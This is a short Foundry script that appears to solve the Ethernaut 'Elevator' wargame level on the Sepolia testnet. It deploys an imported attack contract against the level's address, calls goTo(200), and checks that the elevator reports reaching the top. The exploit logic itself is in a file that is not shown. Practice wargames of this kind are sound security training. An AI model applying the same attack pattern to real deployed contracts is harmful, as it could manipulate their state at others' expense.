// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Cracked11_Elevator.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked11_ElevatorScript --broadcast
contract Cracked11_ElevatorScript is Script {
    address ethernaut_contracts;
    Cracked11_Elevator attack;
    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("Elevator_address"));
    }

    function run() public {
        vm.startBroadcast();
        attack = new Cracked11_Elevator(ethernaut_contracts);
        attack.goTo(200);
        require(IElevator(ethernaut_contracts).top(), "fail");
        vm.stopBroadcast();
    }
}
